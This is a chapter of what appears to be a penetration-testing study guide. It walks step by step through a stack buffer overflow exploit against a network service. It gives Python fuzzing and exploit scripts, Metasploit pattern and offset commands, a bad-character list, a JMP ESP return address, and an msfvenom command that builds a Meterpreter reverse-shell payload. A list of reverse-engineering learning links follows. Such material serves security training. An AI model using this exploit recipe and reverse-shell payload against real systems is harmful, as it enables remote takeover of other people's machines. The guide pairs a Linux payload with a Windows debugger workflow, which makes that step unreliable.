# Chapter 8 - Buffer Overflow / Reverse Engineering

> Reverse engineering is taking apart an object to see how it works in order to duplicate or enhance the object. The practice, taken from older industries, is now frequently used on computer hardware and software. Software reverse engineering involves reversing a program's machine code back into the source code that it was written in, using program language statements.
>
> _**— Anonymous**_

The below will pertain to Buffer Overflow steps.

## Fuzzing

##### STEP 1 - script

The point of this is to crash the application and to find approximately **how many bytes were needed** to crash the application.

```
#!/usr/bin/python

import socket

buffer=["A"]
counter=100 #start at 100 As

while len(buffer) <=1000:
	buffer.append("A"*counter)
	counter=counter+1 #increment by 1 untill 1000

try:
	for string in buffer:
		print "Fuzzing App with %s bytes" % len(string)
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect=s.connect(("127.0.0.1", 9999))
		s.recv(1024)
		s.send(string + '\r\n')
		s.close()

except:
	print "Could not connect to app..."
```

##### STEP 2 - pattern_create

With the number of bytes we found from the previous step, we will use MSF's pattern create tool to create a unique buffer which we will send to the application again.

```
Kali> msf-pattern_create -l <BYTES>
```

The output will be plugged into the **buffer** variable in a simpler fuzzer script, shown below.

```
#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#buffer = 'A' * 520
buffer = **_(Output of msf-pattern_create)_**

try:
	print "\nSending malicious buffer..."
	s.connect(('127.0.0.1',9999))
	data = s.recv(1024)
	s.send(buffer + '\r\n')
	print "\nOverflowed!!!"
except:
	print "Could not connect..."
```

##### STEP 3 - pattern_offset

Now we will run the new script with the pattern_create buffer.
The application should once again crash. Check the **EIP** and take that value and plug it into pattern_offset.

```
Kali> msf-pattern_offset -q <EIP VALUE>

example output: [*] Exact match at offset 524
```

The output of the above command will output an exact offset of bytes in the application. This offset is then used to determine the where the overflow lies from the applications **EBP (524)**, and into **EIP (525)**.


##### STEP 4 - Shellcode size

Because we now know where the cutoff point is in the appplications stack, we can now start looking at how big our allotment for shellcode is. Let's look at the below code.

```
buffer='A'*524 + 'B'*4 + 'C'*(1200-524-4)
```

'A' is used for filling up the applications's buffer. We know we only need 524 because of **STEP 3**.
'B' is used for filling in the EIP register.
'C' is used to show us how much space we are given to add our own (shell)code into it.

This is an important step because the we will try to add a number of 'C' and that will show us if we are limited in size of our shellcode/malicious payload.

The more 'C's you see, the more space you have to inject larger sized shellcode.


##### STEP 5 - bad characters check

Now it's time to test bad characters. These are characters that will cause our shellcode to be interupted if not checked before execution.

_possible bad chars_
```
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
``` 
_note: \x00 may stop/crash your program due to it being a NULL char. Please remove it before continuing if you deem appropriate._

We are going to add the above into our script like below and run.

```
buffer='A'*524 + 'B'*4 + badchars
```

We should expect to see everything in the **badchars** variable within the **ESP** of the application using **ollydbg**.
We should see the following in the hex dump of the **ESP** in the dump...

```
0043F860  01 02 03 04 05 06 07 08  
0043F868  09 0A 0B 0C 0D 0E 0F 10  ....
0043F870  11 12 13 14 15 16 17 18  
0043F878  19 1A 1B 1C 1D 1E 1F 20  
0043F880  21 22 23 24 25 26 27 28  !"#$%&'(
0043F888  29 2A 2B 2C 2D 2E 2F 30  )*+,-./0
0043F890  31 32 33 34 35 36 37 38  12345678
0043F898  39 3A 3B 3C 3D 3E 3F 40  9:;<=>?@
0043F8A0  41 42 43 44 45 46 47 48  ABCDEFGH
0043F8A8  49 4A 4B 4C 4D 4E 4F 50  IJKLMNOP
0043F8B0  51 52 53 54 55 56 57 58  QRSTUVWX
0043F8B8  59 5A 5B 5C 5D 5E 5F 60  YZ[\]^_`
0043F8C0  61 62 63 64 65 66 67 68  abcdefgh
0043F8C8  69 6A 6B 6C 6D 6E 6F 70  ijklmnop
0043F8D0  71 72 73 74 75 76 77 78  qrstuvwx
0043F8D8  79 7A 7B 7C 7D 7E 7F 80  yz{|}~€
0043F8E0  81 82 83 84 85 86 87 88  ‚ƒ„…†‡ˆ
0043F8E8  89 8A 8B 8C 8D 8E 8F 90  ‰Š‹ŒŽ
0043F8F0  91 92 93 94 95 96 97 98  ‘’“”•–—˜
0043F8F8  99 9A 9B 9C 9D 9E 9F A0  ™š›œžŸ 
0043F900  A1 A2 A3 A4 A5 A6 A7 A8  ¡¢£¤¥¦§¨
0043F908  A9 AA AB AC AD AE AF B0  ©ª«¬­®¯°
0043F910  B1 B2 B3 B4 B5 B6 B7 B8  ±²³´µ¶·¸
0043F918  B9 BA BB BC BD BE BF C0  ¹º»¼½¾¿À
0043F920  C1 C2 C3 C4 C5 C6 C7 C8  ÁÂÃÄÅÆÇÈ
0043F928  C9 CA CB CC CD CE CF D0  ÉÊËÌÍÎÏÐ
0043F930  D1 D2 D3 D4 D5 D6 D7 D8  ÑÒÓÔÕÖ×Ø
0043F938  D9 DA DB DC DD DE DF E0  ÙÚÛÜÝÞßà
0043F940  E1 E2 E3 E4 E5 E6 E7 E8  áâãäåæçè
0043F948  E9 EA EB EC ED EE EF F0  éêëìíîïð
0043F950  F1 F2 F3 F4 F5 F6 F7 F8  ñòóôõö÷ø
0043F958  F9 FA FB FC FD FE FF     ùúûüýþÿ
```

Should there be a bad character, we should not see the preceding characters after. For example, if we added **\0x00**, then we shouldn't see any more of the following characters from the **_badchars_** variable in the script.


##### STEP 6 - Find the JMP 

Find the JMP ESP. ESP is the location where our shellcode will theoretically begin. We need to find the address of the function that will jump us to the ESP register.

In **ollydbg**, we can restart the application and **right click**, **search for**, **all commands** will allow us to search for `jmp esp`. We then will copy the address of this function.

With the address of the `JMP ESP`, we will now add it to the script replacing the 'B's. So when the buffer overflow runs, it will add the `JMP ESP` address into the `EIP` and have it jump to where our shellcode starts, `ESP`. **Ollydbg** helps visualize where everything in the application lives.

```
#JMP ESP = 311712F3

buffer='A'*524 + "\xF3\x12\x17\x31" + <SHELLCODE>
```

_note_: It's placed in **little endian** format



###### STEP 7 - Shellcode creation

Time to create our malicious shellcode.

```
Kali> msfvenom -p linux/x86/meterpreter/reverse_tcp -b \x00 LHOST= LPORT= -f python
```

Add the output to the script and call the `buf` variable in the `buffer` variable.

_note_: Adding a NOP sled prior the `buf`.

```
buffer='A'*524 + "\xF3\x12\x17\x31" + '\x90' * 20 + buf
```


##### STEP 8 - Exploit

After your python script is ready, set up a listener according to the shellcode created and run!



## Reverse Engineering Resources

Reverse Engineering is hard and I'm bad at it, looking for contributions to this section. Please DM me on [Twitter](https://twitter.com/dostoevskylabs)

[Reverse Engineering - WikiPedia](https://en.wikipedia.org/wiki/Reverse_engineering#Reverse_engineering_of_software)

[Intro to Reverse Engineering - YouTube](https://www.youtube.com/playlist?list=PLUFkSN0XLZ-nXcDG89jS9iqKBnNHmz7Qw)

[Intro to Reverse Engineering - Course Files](http://opensecuritytraining.info/IntroductionToReverseEngineering.html)

[Intro to x86 Assembly - YouTube](https://www.youtube.com/playlist?list=PL038BE01D3BAEFDB0)

[Intro to x86 Assembly - Course Files](http://opensecuritytraining.info/IntroX86.html)

[Awesome Reversing](https://github.com/fdivrp/awesome-reversing)

[Reverse Engineering 101 - Malware Unicorn](https://securedorg.github.io/RE101/)

[What Can Reverse Engineering Do For You? - Malware Unicorn](https://www.slideshare.net/AmandaRousseau1/what-can-reverse-engineering-do-for-you)

[Lenas Reversing for Newbies](https://tuts4you.com/download.php?list.17)

[PoC\|\|GTFO 0x16](https://archive.org/stream/pocorgtfo16)

